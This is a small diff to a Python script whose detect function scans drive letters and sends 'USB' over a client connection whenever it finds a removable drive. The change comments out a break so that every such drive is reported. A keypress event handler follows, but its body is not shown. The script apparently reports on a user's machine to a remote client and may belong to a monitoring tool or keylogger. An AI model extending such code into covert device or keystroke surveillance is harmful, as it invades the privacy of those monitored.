@@ -12,7 +12,7 @@ def detect(client):
             x = chr(i)
             if w.GetDriveType(x+":\\") == w.DRIVE_REMOVABLE:
                 client.send("USB".encode('ASCII'))
-                break
+                #break
 
 
 def keypress(event):
